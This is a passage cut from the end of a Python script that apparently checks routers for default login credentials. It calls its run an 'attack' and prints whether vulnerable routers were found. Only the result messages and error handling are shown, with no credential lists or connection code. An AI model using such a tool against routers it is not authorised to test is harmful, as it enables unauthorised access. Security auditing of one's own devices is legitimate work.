            print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND - Change default credentials immediately!{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] All routers appear secure - no default credentials found{Colors.END}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Attack interrupted by user{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error during attack: {e}{Colors.END}")

if __name__ == "__main__":
    main()